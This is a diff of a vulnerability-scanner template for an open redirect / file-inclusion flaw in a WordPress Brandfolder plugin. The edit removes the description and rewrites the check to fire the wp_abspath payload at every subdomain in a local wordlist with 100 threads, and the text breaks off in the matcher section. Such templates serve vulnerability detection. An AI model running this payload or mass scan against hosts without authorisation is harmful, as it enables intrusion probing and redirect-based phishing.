@@ -1,18 +1,22 @@
 id: brandfolder-open-redirect
 
 info:
-  name: WordPress Brandfolder Plugin Open Redirect
+  name: Wordpress brandfolder plugin Open Redirect
   author: 0x_Akoko
   severity: low
-  description: A vulnerability in WordPress Brandfolder allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.
   reference: https://www.exploit-db.com/exploits/39591
   tags: wordpress,wp-plugin,lfi,rfi
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://example.com/"
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /wp-content/plugins/brandfolder/callback.php?wp_abspath=https://example.com/ HTTP/1.1
+        Host: {{Subdomains}}
     matchers:
       - type: regex
         regex:
